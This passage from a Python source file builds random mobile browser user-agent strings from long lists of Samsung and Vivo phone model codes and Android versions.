'SAMSUNG-SM-N900A', 'SM-N9005', 'SM-N900W8', 'Samsung GALAXY Note 3', 'SM-N900L', 'SM-N9009', 'SM-N900T', 'SM-N900P', 'SM-N9000Q', 'SAMSUNG SM-N9002', 'SM-N9002', 'SAMSUNG SM-N9002', 'SM-N9002', 'SM-N9002', 'SM-N9002', 'SM-9005', 'SM-9005', 'SM-N750L', 'SM-N7505', 'SM-N7502', 'SM-N7502', 'SAMSUNG SM-N7502', 'SM-N7502', 'SM-N7502', 'SAMSUNG SM-N7502', 'SM-N7502', 'SM-N7502', 'SM-N9100', 'SM-N910C', '1440x2560', 'SM-N910V', 'SM-N910H', 'SM-N910U', 'SM-N9108V', 'SM-N915FY', 'SM-N915T', 'SM-N9150', 'SM-N915G', 'SM-N915A', 'SM-N915S', 'SM-N915D', 'SM-N915W8', 'SM-N916L', 'SM-N916S', 'SM-N916K', 'SM-N916LSK', 'SM-N920C', 'SM-N920L', 'SAMSUNG SM-N920C', 'SAMSUNG-SM-N920A', 'SM-N920K', 'SM-N920S', 'SM-N920G', 'SM-N920V', 'SM-N920I', 'SM-N9208', 'SM-N930F', 'SM-N9300', 'SM-N930x', 'SM-N930P', 'SM-N930X', 'SM-N930W8', 'SM-N930V', 'SM-N930T', 'SM-N9500', 'SM-N950U', 'SM-N950F', 'SM-N950N', 'SAMSUNG SM-N950F', 'SM-N960U', 'SM-N960F', 'SM-N960U', 'SM-N960U1', 'SM-N960W', 'SC-01G', 'SCL24', 'SAMSUNG SCL24', 'SM-N935S', 'SM-N935F', 'SM-N935K', 'SM-N935L', 'N7100', 'GT-N7100', 'SAMSUNG GT-N7100', 'GT-N7100', 'GT-N7105', 'GT-N7105T', 'SAMSUNG GT-N7105/N7105XXDMC3', 'GT-N7105T', 'GT-N7105', 'GT-N7105', 'GT-N7105', 'GT-N7105', 'GT-N7105', 'Galaxy Note N8000', 'Galaxy Note20', 'SAMSUNG EK-GN120', 'SM-G550T', 'SM-G5500', 'SM-G550FY', 'SM-G5510', 'SM-G550T1', 'SM-S550TL', 'SM-G5528', 'SM-G5528', 'SM-G600FY', 'SM-G600F', 'SM-G6000', 'SM-G6100', 'SM-G610S', 'SM-G611F', 'SM-G611L', 'SM-G611S', 'SAMSUNG SM-J710FN', 'P1 Galaxy Plus', 'SM-G110M', 'SM-G110H', 'SM-G110B', 'SM-G110H', 'SM-G110H', 'GT-S5310', 'GT-S5310I', 'GT-S5310C', 'GT-S5310B', 'GT-S5310T', 'GT-S5310G', 'GT-S5310E', 'GT-S5310E', 'GT-S5310L', 'GT-S5310G', 'GT-S5310', 'GT-S5310G', 'GT-S5301B', 'GT-S5301B', 'Gt-s5301b', 'GT-S5301B', 'GT-S5301', 'GT-S5301', 'GT-S5301B', 'GT-S5301', 'GT-S5301B', 'GT-S5301', 'SAMSUNG GT-S5301/S5301XXAMA3', 'GT-S5301B', 'GT-S5301L', 'GT-B7510', 'GT-B7510B', 'GT-B7510', 'GT-B7510B', 'GT-B7510', 'GT-B7510L', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510B', 'GT-B7510', 'GT-B7510', 'SM-A826S', 'SAMSUNG SM-A826S', 'SAMSUNG SM-M536S', 'SM-G910S', 'SM-G910S', 'SM-G910S', 'SAMSUNG SM-G910S', 'GT-I9000', 'GT-I9000', 'GT-I9088', 'GT-I9000', 'GT-I9000', 'GT-I9000', 'GT-I9000', 'GT-I9008', 'GT-i9008', 'GT-I9000', 'GT-I9000', 'GT-I9000B', 'GT-I9000M', 'GT-I9000', 'GT-I9070', 'GT-I9070', 'GT-I9070', 'GT-I9070P', 'GT-I9070P', 'SAMSUNG GT-I9070/I9070BULK1', 'GT-I9070', 'GT-S7562C', 'GT-S7562C', 'GT-S7562C', 'GT-S7562C', 'GT-S7562C', 'GT-S7562C', 'GT-S7562C', 'GT-S7562L', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'SPH-D710', 'SHV-E120S', 'SHV-E120L', 'SHV-E120K/KKJMD2', 'SHV-E120L', 'SHV-E120LSK', 'SHV-E120LSK', 'SHV-E120LKS', 'SHV-E120S', 'SHV-E120S', 'SHV-E120S', 'SHV-E120S', 'SHV-E120S/KKJMD2', 'GT-I9105P', 'GT-I9105', 'GT-I9105', 'GT-I9105P', 'GT-I9105', 'GT-I9105', 'ISW11SC', 'SCH-I535', 'GT-I9300', 'GT-I9300', 'GT-I9305', 'SCH-R530X', 'SCH-R530X', 'SCH-R530U', 'GT-I9305T', 'SCH-R530C', 'GT-I8190', 'GT-I8190', 'GT-I8190', 'GT-I8190', 'GT-I8190', 'GT-I8190', 'GT-I8190N', 'GT-I8190', 'GT-I8190T', 'GT-I8190N', 'GT-I8200N', 'GT-I8200', 'GT-I8200', 'GT-I8200N', 'GT-I8200', 'GT-I8200L', 'GT-I8200', 'GT-I8200Q', 'GT-I8200Q', 'GT-I9301I', '720x1280', 'Samsung Galaxy S IV(I950X)', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'SAMSUNG GT-I9001/I9001BOKQ4', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'SM-G973F', 'SAMSUNG SM-G973F', 'SAMSUNG SM-G973U', 'SM-G977N', 'SM-G973U1', 'SAMSUNG SM-G973F/G973FXXSGHWC2', 'SAMSUNG SM-G977N', 'SAMSUNG SM-G770F', 'SM-G770F/DS', 'SM-G975F', 'SAMSUNG SM-G975F', 'SM-G975U', 'SM-G975U1', 'SAMSUNG SM-G975U', 'SAMSUNG SM-G975F/G975FXXSGHWC2', 'SC-05L', 'SM-G970F', 'SAMSUNG SM-G970F/G970FXXSGHWA3', 'SM-G970U', 'SM-G970U1', 'SAMSUNG SM-G980F', 'SM-G980F/DS', 'SM-G981U', 'SM-G981U', 'SM-G981B', 'SCG01', 'SM-G981U1', 'SM-G981W', 'SM-G981V', 'SM-G981N', 'SC-51A', 'SM-G9810', 'SC51Aa', 'SM-G780G', 'SAMSUNG SM-G780F', 'SAMSUNG SM-G780G', 'SM-G781B', 'SM-G781V', 'SM-G781U', 'SM-G781U1', 'Galaxy S20 Ultra', 'SM-G988B', 'SM-G988W', 'SM-G988U', 'SAMSUNG SM-G988B', 'SM-G988U1', 'SM-G988N', 'SAMSUNG SM-G985F/G985FXXSFFVIB', 'SM-G985F/DS', 'SM-G986B', 'SM-G986U', 'SAMSUNG SM-G986B', 'SM-G986N', 'SM-G986W', 'SM-G986U1', 'Galaxy S21', 'SM-G991W', 'SM-G991U1', 'SM-G991B', 'SM-G991B', 'SM-G991B', 'SC-51B', 'SM-G991V', 'SM-G990U2', 'SM-G990B2', 'SAMSUNG SM-G990B', 'SM-G990E', 'SAMSUNG SM-G990B/G990BXXU4EWC7', 'SM-G998U', 'SAMSUNG SM-G998B', 'SM-G998N', 'SM-G998U1', 'SAMSUNG SM-G998U', 'SM-G998W', 'Galaxy S21+', 'SM-G996U', 'SM-G996B', 'SM-G996N', 'SM-G996B', 'SM-G9960', 'SM-S901U', 'SAMSUNG SM-S901U', 'SM-S901U1', 'SM-S901B', 'SAMSUNG SM-S901B', 'SM-S901W', 'SAMSUNG SM-S908E', 'SM-S908B', 'SAMSUNG SM-S908U', 'SM-S908U1', 'SM-S9080', 'SM-S908U1', 'SAMSUNG SM-S908B', 'SM-S906E', 'SM-S906U', 'SAMSUNG SM-S906N', 'SM-S906E', 'SM-S906U', 'SAMSUNG SM-S906B', 'SM-S906U1', 'SM-S906W', 'SM-S911W', 'SM-S911B', 'SM-S911U', 'SM-S911U1', 'SM-S918W', 'SAMSUNG SM-S918B/S918BXXS1AWD1', 'SM-S918U', 'SM-S918U1', 'SM-S916U', 'SM-S916B', 'SM-S916U1', 'SM-S916W', 'Galaxy S3', 'Samsung Galaxy S3', 'Galaxy S3', 'SM-G730V', 'SAMSUNG-SM-G730A', 'SM-G730W8', 'SAMSUNG-SM-G730A', 'SM-G730W8', 'SM-G730W8', 'GT-I9505', 'SAMSUNG GT-I9505/I9505XXUBMEA', 'SCH-I959', 'SAMSUNG GT-I9505-ORANGE', 'SCH-I545', 'GT-I9500', 'SAMSUNG GT-I9505/I9505XXUBMEA', 'SAMSUNG GT-I9505', 'SAMSUNG GT-I9505/I9505XXUAMDC', 'SAMSUNG GT-I9505/I9505XXUDMGG', 'GT-I9295', 'SHV-E330S', 'SHV-E330L', 'SAMSUNG SHV-E330L', 'SHV-E330S', 'SHV-E330K', 'SAMSUNG SHV-E330S', 'SHV-E330K', 'GT-I9195', 'lineage_serranoltexx', 'GT-I9195I', 'GT-I9192I', 'GT-I9190', 'GT-I9192', 'SCH-I435', 'GT-I9515', 'GT-I9506', 'SAMSUNG GT-I9506', 'SAMSUNG SM-C105L', 'SAMSUNG SM-C101', 'SAMSUNG SM-C101', 'SAMSUNG SM-C101', 'SAMSUNG SM-C105', 'SM-C105K', 'SM-C105S', 'SM-C105L', 'SM-C105K', 'SM-C105S', 'SM-C105L', 'SM-C105S', 'SM-C105L', 'SM-G900T', 'SM-G900F', 'SM-G900V', 'SM-G900M', 'SM-G900F', 'SM-G900P', 'SM-G900H', 'SM-G9006V', 'SM-G900F', 'SM-G870W', 'SAMSUNG-SM-G890A', 'SAMSUNG-SM-G870A', '1080x1920', 'SAMSUNG SM-G890A', 'SM-G900FD', 'SM-G860P', 'SM-G901F', 'SAMSUNG SM-G901F/G901FXXU1CPHA', 'SM-G800F', 'SM-G800H', 'SM-G903F', 'SM-G903W', 'SM-G920I', 'SM-G920P', 'SM-G920F', 'SM-G920W8', 'SAMSUNG SM-G920F', 'SM-G920K', 'SAMSUNG-SM-G920A', 'SM-G925F', 'SM-G925K', 'SAMSUNG-SM-G925A', 'SM-G9250', 'SAMSUNG SM-G925F', 'SAMSUNG SM-G928F', 'SAMSUNG-SM-G928A', 'SM-G928C', 'SM-G9280', 'SM-G9287', 'SAMSUNG SM-G928T', 'SM-G928I', 'SM-G930F', 'SM-G930W8', 'SAMSUNG SM-G930F', 'SM-G930V', 'SM-G930U', 'SM-G930S', 'SM-G930L', 'SM-G9300', 'SAMSUNG-SM-G891A', 'SAMSUNG SM-G891A', 'SM-G935F', 'SM-G935U', 'SAMSUNG SM-G935A', 'SM-G935T', 'SM-G935VC', 'SM-G935S', 'SM-G935L', 'SAMSUNG SM-G935W8', 'SM-G9350', 'SAMSUNG SM-G950U', 'SAMSUNG SM-G950F', 'SM-G950U1', 'SM-G950N', 'SC-02J', 'SAMSUNG SM-G950W', 'SM-G892A', 'SAMSUNG SM-G892A', 'SAMSUNG SM-G892U', 'SM-G8750', 'SM-G8750', 'SM-G8750', 'SAMSUNG SM-G8750', 'SM-G955U', 'SM-G955F', 'SAMSUNG SM-G955F/G955FXXUCDVG4', 'SM-G955W', 'SM-G9550', 'SM-G960F', 'SM-G960U', 'SAMSUNG SM-G960U1', 'SAMSUNG SM-G960F', 'SM-G965U', 'SM-G965F', 'SM-G965F', 'SM-G965U1', 'SM-G9650', 'SAMSUNG-SM-J321AZ', 'SAMSUNG-SM-J321AZ', 'SAMSUNG SM-J321AZ', 'SAMSUNG-SM-J326AZ', 'SM-J336AZ', 'SAMSUNG SM-J336AZ', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700L', 'GT-I5700', 'GT-I5700', 'GT-I5700L', 'GT-I5700R', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-S5280', 'GT-S5280', 'GT-S5280', 'GT-S5280', 'SCH-I200', 'SCH-I200PP', 'SCH-I200', 'SCH-I200PP', 'SCH-I200', 'SCH-I200PP', 'SCH-I200PP', 'SCH-I200PP', 'SCH-I829', 'SCH-I829', 'SCH-I829', 'SCH-I829', 'SCH-I829', 'GT-P1000', 'GALAXY TAB', 'Galaxy Tab', 'GT-P1000', 'Galaxy Tab 2', 'Galaxy Tab 2 3G', 'GT-P3100', 'Flow', 'GT-P3113', 'GT-P3113', 'GT-P3110', 'GT-P3110', 'SM-T116', 'SM-T116NU', 'SM-T116NY', 'SM-T116NQ', 'Galaxy Tab 4', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'Galaxy Tab KT107', 'Galaxy Tab Pro', 'Galaxy Tab PRO 10', 'SAMSUNG-SM-T2519', 'Samsung galaxy tab s3', 'Galaxy Tab2 3G', 'Galaxy Tab3 P5200', 'Galaxy Tab3 T311', 'Galaxy Tab4', 'GT-S7560', 'SAMSUNG GT-S7560/S7560XXBNC2', 'GT-S7560M', 'SAMSUNG GT-S7560/S7560XXBNJ1', 'SAMSUNG GT-S7560/S7560XXAME9', 'SAMSUNG GT-S7560/S7560XXAMH3', 'SAMSUNG-SCH-I699I', 'GT-S7560M', 'GT-S7560M', 'GT-S7560M', 'GT-S7560M', 'SCH-I699I', 'SAMSUNG-SCH-I699I', 'GT-S7560M', 'GT-S7560', 'GT-S7560', 'GT-S7560', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', '800x1212', 'GT-S7390', 'GT-S7390', 'GT-S7390G', 'GT-S7390', 'GT-S7580', 'GT-S7580', 'GT-S7580L', 'SAMSUNG GT-S7580/S7580XXUBOA1', 'GT-S7580', 'GT-S7580', 'GT-S7580', 'GT-S7580', 'GT-S7580', 'GT-S7580', 'GT-S7580L', 'SM-G318MZ', 'SM-G318HZ', 'GT-I8150', 'GT-I8150', 'GT-I8150', 'GT-I8150', 'SM-T255S', 'SM-T255S', 'SM-T255S', 'SM-T255S', 'SM-T255S', 'GT-I8150', 'SAMSUNG-SM-W2016', 'SM-W2016', 'SM-W2018', 'SM-W2018', 'SAMSUNG SM-W2019', 'SM-W2019', 'SAMSUNG SM-W2021', 'SM-W2021', 'SM-W2021', 'SAMSUNG SM-W2022', 'SAMSUNG SM-W9023', 'SM-G600S', 'SAMSUNG SM-G600S', 'SAMSUNG SM-E426S', 'GT-I8552', 'GT-I8552', 'GT-I8552B', 'GT-I8552', 'GT-I8552', 'SM-G3812', 'SM-G3812', 'SM-G3812B', 'SM-G3812B', 'SM-G3812', 'SM-G3812', 'Samsung SM-G3818', 'SM-G3818', 'SM-G3812', 'Galaxy Wonder', 'SX Galaxy Xcove 4S', 'GT-S7710L', 'GT-S7710', 'GT-S7710', 'GT-S7710-ORANGE/S7710XXANE3', 'GT-S7710', 'GT-S7710', 'GT-S7710L', 'GT-S7710', 'GT-S7710L', 'GT-S7710', 'GT-S7710', 'GT-S7710', 'GT-S7710L', 'SM-G388F', 'SAMSUNG SM-G388F', 'SM-G389F', 'SM-G390F', 'SM-G390W', 'SM-G398FN', 'SAMSUNG SM-G398FN', 'SM-G525F', 'SM-G525N', 'SAMSUNG SM-G525F', 'SM-G736U1', 'SM-G736B', 'SM-G736W', 'SAMSUNG SM-G736B', 'SM-G889A', 'SM-G715FN', 'SAMSUNG SM-G715FN', 'SM-G715U1', 'SM-G715W', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'gt-s5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360L', 'GT-S5360L', 'GT-S5360L', 'GT-B5510-ORANGE/B5510BVLH1', 'GT-B5510', 'GT-B5510', 'GT-B5510', 'GT-B5510', 'SAMSUNG GT-B5510/B5510XXLE1', 'SAMSUNG GT-B5510/B5510XXLL1', 'GT-B5510', 'GT-B5510L', 'GT-B5510B', 'GT-B5510L', 'GT-B5510', 'GT-B5510', 'GT-B5510-ORANGE/B5510BVLH1', 'GT-B5510-ORANGE/B5510BVLF1', 'GT-B5510-ORANGE/B5510BVLD1', 'GT-B5510-ORANGE/B5510BVLB1', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512B', 'GT-B5512B', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512B', 'GT-S6310N', 'GT-S6310B', 'GT-S6310N', 'GT-S6310N', 'GT-S6310N-ORANGE/S6310NXXAMK1', 'GT-S6310T', 'GT-S6310T', 'GT-S6310L', 'GT-S6310L', 'GT-S6310L', 'GT-S6310T', 'GT-S6310N', 'GT-S6310L', 'SM-G130H', 'SM-G130HN', 'SM-G130E', 'SM-G130BT', 'SM-G130BU', 'SM-G130BU', 'SM-G130BU', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'SM-F700N', 'U', 'SM-F700U1', 'SM-F7000', 'SM-F700W', 'SM-F711U1', 'SAMSUNG SM-F711B/F711BXXU2CVC7', 'SM-F711N', 'SAMSUNG SM-F711U', 'SM-F721B', 'SM-F721U', 'SAMSUNG SM-F721B', 'SM-F721U1', 'SM-F707B', 'SAMSUNG SM-F707B', 'SM-F707U', 'SM-F7070', 'SM-F707U1', 'SM-F707UZAAXAA', 'SM-F707W', 'SM-F916B', 'SM-F916U', 'SAMSUNG SM-F916B', 'SAMSUNG SM-F916U1', 'SM-F926U', 'SM-F926B', 'SM-F9260', 'SM-F926N', 'SM-F926W', 'SAMSUNG SM-F926B', 'SM-F936U', 'SAMSUNG SM-F936B', 'SM-F936U', 'SM-F936U1', 'SAMSUNG SM-F936W', 'galaxy Z Fold2', 'SAMSUNG SM-Z130H', 'SM-Z200F', 'SM-Z300H', 'SM-Z300H', 'SAMSUNG SM-Z300H', 'Gear Live', 'SM-R750', 'GT-I9060I', 'GT-I9060I', 'Samsung J600GN,telcel,mx', 'SAMSUNG M2004J19C', 'SAMSUNG M2006C3LG', 'SAMSUNG M2102J20SG', 'Samsung M6', 'Samsung N70', 'SAMSUNG N9106', 'SAMSUNG-N9106', 'SAMSUNG-N9106HD', 'GT-I8000', 'SAMSUNG-P9700', 'SAMSUNG S2_PRO', 'SM-G530T1', 'SAMSUNG-T805C', 'SAMSUNG-T805S', 'SAMSUNG-T950S', 'GT-S8500'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36'.format(self.android_version, self.android_model, self.browser_version))
                elif self.jenis == 'Vivo':
                    self.android_version = random.choice(['13', '12', '11', '10', '10.0'])
                    self.android_model = random.choice(['vivo 1002T', 'Vivo 1605', 'vivo 1730', 'vivo 1809', 'vivo_1820', 'vivo 1835', 'vivo 1914', 'vivo 2010', 'vivo 2019', 'vivo 2019', 'vivo 2019', 'vivo 2023', 'vivo 2027', 'vivo 3969', 'VIVO 5', 'Vivo 6', 'Vivo 7 Pro', 'Vivo 8', 'Vivo 93K Prime', 'vivo A5 ', 'vivo a54', 'Vivo A54', 'vivo a57', 'Vivo A87', 'VIVO A94', 'VIVO AIR', 'VIVO C8818', 'vivo E1', 'vivo E3', 'vivo E3', 'vivo E5', 'Vivo EGO', 'V1962BA', 'vivo h5', 'V1824A', 'V1824A', 'V1824BA', 'V2217A', 'V2217A', 'V2218A', 'V2218A', 'V2218A', 'V2243A', 'V1955A', 'I1927', 'I1928', 'V2024A', 'V2025A', 'V2025A', 'V2049A', 'V2049A', 'I2009', 'I2012', 'I2012', 'V2136A', 'V2136A', 'V2141A', 'V2171A', 'I2017', 'V2172A', 'V2172A', 'I2022', 'I2019', 'I2019', 'I2201', 'V1914A', 'V1914A', 'V1981A', 'V2055A', 'V2118A', 'V2157A', 'V2157A', 'V2154A', 'V2196A', 'V2196A', 'V2199A', 'V2231A', 'V2238A', 'V1936AL', 'V1936A', 'V1922A', 'V1922A', 'V1922A ', 'V1916A', 'V2023A', 'V2023A', 'VIVO V2023A', 'V2065A', 'V2061A', 'V2061A', 'V2143A', 'V2106A', 'V2165A', 'V2165A', 'V2180GA', 'V1986A', 'V2012A', 'V2012A', 'V2073A', 'V2073A', 'I2011', 'V2148A', 'I2018', 'V1919A', 'V2131A', 'V2220A', 'I2202', 'I2206', 'I2203', 'I2202', 'I2127', 'I2202', 'I2208', 'I2208', 'I2126', 'I2126', 'I2126', 'V2164KA', 'V2164KA', 'VIVO IV', 'VIVO IV', 'VIVO IV', 'VIVO IV', 'Vivo J5', 'vivo 1805', 'vivo 1805', 'vivo NEX', 'V1923A', 'vivo 1912', 'V1923A', 'vivo 1912', 'vivo 1913', 'V1924A', 'V1924A', 'vivo 1913', 'V1950A', 'V1950A', 'vivo NEX A', 'vivo NEX A', 'vivo 1813', 'V1821A', 'V1821A', 'vivo NEX S', 'vivo NEX S', 'Vivo ONE', 'Vivo ONE', 'PA2170', 'vivo PD1628F_EX', 'vivo PD1709', 'vivo PD1709F_EX', 'vivo PD1709F_EX', 'vivo PD1728', 'vivo PD1728', 'vivo PD1832F_EX', 'vivo PD2046F_EX', 'vivo PD2050F_EX', 'vivo PD2055F_EX', 'vivo PD2059F_EX', 'Vivo S', 'V1831A', 'V1831A', 'VIVO S1', 'Vivo S1 Prime', 'V1832A', 'V1832T', 'V2121A', 'V2121A', 'V2130A', 'V2130A', 'Vivo S11', 'Vivo S11 ', 'vivo S11t', 'vivo S11t', 'vivo S11t', 'vivo S11t', 'vivo S12', 'V2162A', 'Vivo S13', 'V2203A', 'V2207A', 'V2190A', 'V2244A', 'vivo S1Pro', 'Vivo S20 ', 'Vivo S21 ', 'Vivo S31', 'Vivo S4', 'Vivo S40', 'Vivo S41 /MMB439M', 'V1932A', 'vivo S6', 'V1962A', 'vivo S6T', 'V2020CA', 'V2020A', 'Vivo S76', 'V2031EA', 'vivo S7i(t)', 'vivo S7i(t)', 'vivo S7i(t)', 'V2080A', 'vivo S7t', 'vivo_S7t', 'vivo S7t', 'S7t 5G', 'vivo S7w', 'vivo S8', 'vivo S9', 'vivo S9', 'vivo S9', 'V2072A', 'V2048A', 'vivo S9t', 'V2168', 'V2168', 'V2153', 'V2153', 'V2150', 'V2151', 'V2151', 'V2151', 'V2143', 'vivo TD1602_EX', 'vivo U1', 'vivo 1916', 'vivo 1916', 'vivo 1921', 'V1941A', 'V1941A', 'V1928A', 'vivo V1', 'vivo V1', 'vivo V10', 'Vivo V10', 'VIVO V11', 'Vivo V11', 'vivo 1804', 'vivo 1804', 'vivo 1806', 'vivo 1806', 'vivo v11pro', 'vivo 1819', 'vivo 1818', 'vivo 1818', 'vivo 1920', 'vivo 1919', 'vivo 1907', 'vivo 1907', 'vivo 1907_19', 'vivo 1910', 'vivo 1909', 'vivo 1910', 'vivo 1933', 'vivo 1933', 'vivo V1907', 'vivo v19neo', 'vivo V1Max', 'vivo V1Max', 'vivo V2', 'V2040', 'vivo 2018', 'vivo 2018', 'V2022', 'Vivo V20A', 'Vivo V20G', 'V2066', 'V2108', 'V2050', 'V2050', 'V2050', 'V2061', 'V2055', 'Vivo V21S', 'V2130', 'V2132A', 'V2116', 'V2115', 'V2116', 'V2116', 'V2126', 'V2126', 'V2228', 'V2228', 'V2158', 'V2158', 'V2202', 'V2202', 'V2201', 'V2246', 'V2230', 'V2230', 'V2237', 'vivo V3', 'vivo V3', 'vivo V3Max A', 'vivo V3Max L', 'vivo v30', 'vivo v31', 'vivo V3L', 'vivo V3L', 'vivo V3L', 'vivo V3L', 'vivo V3M A', 'vivo V3M A', 'vivo V3MA', 'vivo_V3Max', 'vivo v45', 'vivo 1601', 'vivo V5', 'vivo 1609', 'vivo 1611', 'Vivo V51', 'Vivo V54', 'vivo 1612', 'vivo 1713', 'vivo V5S A', 'vivo 1718', 'vivo 1716', 'vivo Y79A', 'vivo Y79A', 'V2166BA', 'Vivo V8', 'vivo 1723', 'vivo V9 mini', 'vivo 1851', 'VIVO V9Pro', 'vivo 1851', 'vivo 1727', 'Vivo X', 'V2178A', 'V2229A', 'V2170A', 'V2170A', 'vivo Xplay3S', 'vivo Xplay3S', 'vivo Xplay3S', 'vivo Xplay5A', 'vivo Xplay5A', 'vivo Xplay5A', 'vivo Xplay5S', 'vivo Xplay5S', 'vivo Xplay6', 'vivo Xplay6L', 'vivo Xplay6', 'vivo Xplay6', 'vivo X710L', 'vivo X710L', 'vivo X710L', 'vivo X710L', 'vivo X1', 'vivo X1', 'vivo X1', 'vivo X1', 'Vivo X11', 'vivo X1S', 'vivo X1S', 'vivo X1S', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1W', 'vivo X1w', 'VIVO X2', 'VIVO X2', 'VIVO_X2', 'vivo X20', 'vivo X20A', 'vivo X20Plus A', 'vivo 1720', 'vivo X20Plus UD', 'vivo X20Plus UD', 'vivo X21', 'vivo X21A', 'vivo X21UD A', 'vivo X21i', 'vivo X21i A', 'vivo X21i', 'vivo X21i A ', 'V1814A', 'V1814T', 'V1814T', 'V1814A', 'V1809A', 'V1809A', 'V1816A', 'V1809T', 'V1816T', 'V1829A', 'V1838A', 'V1838T', 'V1829T', 'V1836A', 'V1836A', 'V1836T', 'vivo X27Pro', 'V1938CT', 'V1938T', 'V1938T', 'vivo X3F', 'vivo X3F', 'vivo X3F', 'vivo X3L', 'vivo X3L', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S W', 'vivo X3S W', 'vivo X3S W', 'vivo X3S W', 'vivo X3t', 'vivo X3t', 'vivo X3t', 'vivo X3t', 'vivo X3V', 'vivo X3V', 'vivo X3V', 'vivo X3V', 'Vivo X40', 'vivo X5L', 'vivo X5', 'vivo X5L', 'vivo X5Pro D', 'vivo X5Pro L', 'vivo X5Pro V', 'vivo X5Pro D', 'vivo X5Pro D', 'V2001A', 'V2001A', 'vivo 2004', 'vivo 2005', 'vivo 2005', 'V1937', 'vivo 1937', 'V1937', 'V1937', 'vivo 2006', 'vivo 2006', 'V2005A', 'V2011A', 'X50 Pro+', 'V1930', 'V1930', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X520L', 'vivo X5F', 'vivo X5M', 'vivo X5M', 'vivo X5M', 'vivo X5Max ', 'vivo X5Max L', 'vivo X5Max L', 'vivo X5Max S', 'vivo X5Max V', 'vivo X5S L', 'vivo X5S L', 'vivo X5V', 'vivo X5V', 'vivo X5V', 'vivo X6D', 'vivo X6A', 'vivo X6Plus D', 'vivo X6Plus A', 'vivo X6Plus L', 'vivo X6Plus D', 'vivo X6Plus A', 'vivo X6Plus D', 'vivo X6Plus L', 'V2046A', 'V2059A', 'V2046A', 'V2045', 'V2046', 'V2047A', 'V2056A', 'V2085A', 'vivo X6S A', 'vivo X6S A', 'vivo X6S A', 'vivo X6S A', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus A', 'vivo X7L', 'vivo X7Plus', 'vivo X7Plus', 'V2133A', 'V2104', 'V2104', 'V2105', 'V2134A', 'V2105', 'V2145A', 'V2114', 'V2145A', 'vivo X710F', 'vivo X710F', 'vivo X710F', 'vivo X710F', 'V2144', 'V2183A', 'V2144', 'V2208', 'V2185A', 'V2145', 'V2185A', 'Vivo X83', 'vivo X9', 'vivo X9L', 'vivo X9', 'vivo X9', 'vivo X9Plus', 'vivo X9Plus L', 'V2241A', 'V2242A', 'V2242A', 'V2227A', 'vivo X9i', 'vivo X9i', 'vivo X9i', 'vivo X9s', 'vivo X9s L', 'vivo X9s Plus', 'vivo X9s Plus', 'vivo X9s Plus L', 'vivo X9s Plus', 'VIVO XL', 'vivo Xplay', 'vivo Xshot', 'vivo Xshot', 'vivo Xshot', 'vivo Xshot', 'V2203', 'V2221', 'Vivo y1', 'Vivo Y1', 'V2168A', 'V2168A', 'vivo 1906', 'V2028', 'vivo Y11t', 'vivo Y11t', 'vivo Y11t', 'vivo 1904', 'V2163A', 'V2102', 'V2102', 'vivo 2007', 'vivo 2007', 'Vivo Y12I Pro', 'V2026', 'V2042', 'V2033', 'V2039', 'V2069', 'V2026_21', 'vivo Y13L', 'vivo Y13', 'vivo Y13L', 'vivo Y13L', 'vivo Y13i', 'vivo_Y13i', 'vivo Y13iL', 'vivo Y13iL', 'vivo Y13T', 'vivo Y13T', 'vivo 1901', 'vivo Y15T', 'vivo Y15T', 'V2134', 'V2147', 'V2147', 'V2212', 'V2120', 'V2204', 'V2214', 'V2204', 'vivo 1902', 'vivo 1902_19', 'VIVO 1902', 'vivo Y17T', 'vivo Y17T', 'vivo_Y17T', 'vivo Y17T', 'vivo Y17W', 'vivo Y17W', 'vivo Y17W', 'vivo Y18L', 'vivo Y18L', 'vivo Y18L', 'vivo 1915', 'vivo Y19t', 'vivo Y19t', 'vivo Y19t', 'vivo Y19t', 